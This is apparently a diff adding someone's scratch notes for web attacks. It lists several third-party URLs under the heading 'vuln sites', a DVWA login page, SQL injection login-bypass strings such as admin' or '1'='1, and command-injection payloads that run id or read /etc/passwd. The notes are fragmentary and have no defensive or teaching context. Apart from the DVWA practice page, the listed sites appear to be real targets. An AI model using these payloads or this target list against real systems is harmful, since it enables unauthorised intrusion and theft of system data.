@@ -1,4 +1,33 @@
-last :
-Stored request 841 into memory.
+normalisation.
+version Detection
+reconstruction
 
-Stored new request 156 into memory
+test queries
+turn on metadata and ANALYSIS on
+
+~/detoxio/bin/activate
+
+vuln sites:
+http://area7.ru/photoshop.php
+https://sunycuad.org/conference.php
+https://eucd.info/index.php/
+http://forum.wampserver.com/read.php?2,13744
+
+https://dvwa.exp-9.com/login.php
+
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+
+a|/usr/bin/id
+;system('cat%20/etc/passwd')
+;system('id')
+;system('/usr/bin/id')
+%0Acat%20/etc/passwd
+%0A/usr/bin/id
+%0Aid
